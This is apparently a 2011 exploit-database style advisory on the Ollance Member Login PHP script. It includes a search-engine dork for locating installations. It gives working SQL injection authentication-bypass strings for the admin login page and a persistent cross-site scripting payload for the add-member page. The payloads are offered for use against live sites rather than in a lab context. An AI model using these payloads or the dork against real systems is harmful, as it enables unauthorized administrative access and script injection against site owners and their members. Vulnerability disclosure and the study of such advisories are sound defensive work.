@@ -1,0 +1,50 @@
+# Exploit Title: Ollance login script Multiple Vulnerabilities
+# Vendor:  www.ollance.com
+# Date: 1st july,2011
+# Author: $#4d0\/\/[r007k17] a.k.a Raghavendra Karthik D(karthikaryabhat@gmail.com),NITK
+# Google Dork: Powered by Ollance Member Login Script
+
+**************************************** BRIEF DESCRIPTION *****************************
+
+Ollance Member Login is a PHP membership management system. Your clients can
+access your products through client area which is protected by password. You
+can easy to create and manage your clients as well as protected directories.
+Ollance Member Login is your solution if you have a subscription service or
+providing downloadable products or even you want to make secure system for
+your members.
+
+Ollance Member Login uses PHP and MySQL for lightning fast processing. It
+comes with a control panel that enables an administrator to create new user
+accounts and new secured access areas, as well as manage user accounts, send
+emails to members, and more. Ollance Member Login assists administrators in
+handling these features with ease.
+In short, Ollance Member Login offers a quick, easy, reliable way to provide
+comprehensive gate keeping for any site that meets the system requirements,
+so that web visitors must be authorized before entering that sites secured
+areas
+
+*********************** (Auth ByPass) SQLi Vulnerability *********************************
+{DEMO} : site.com/php-member-login/admin/login.php
+
+EXPLOIT 1:  Username:  admin' or'1=1
+                password:   admin' or'1=1
+
+             or Username: ' or 0=0 #
+                 Password: ' or 0=0 #
+Observe: Attackers can use Authentication Bypass to get into Admin Panel in
+the site.
+
+
+Persistent XSS Vulnerability
+********************************
+EXPLOIT 2: Persistent XSS Vulnerability in add member in admin panel
+
+   {Demo}:  site.com/php-member-login/admin/add_member.php?msg=
+">><marquee><h1>$#4|)0\/\/</h1><marquee>
+
+ Observe: A persistent cross-site scripting vulnerability in Ollance login
+Script can be exploited to execute arbitrary JavaScript.
+******************************************************************************************
+
+sp3c14l Thanks to s1d3 effects and my friends@!3.14--
+**************************************************************************
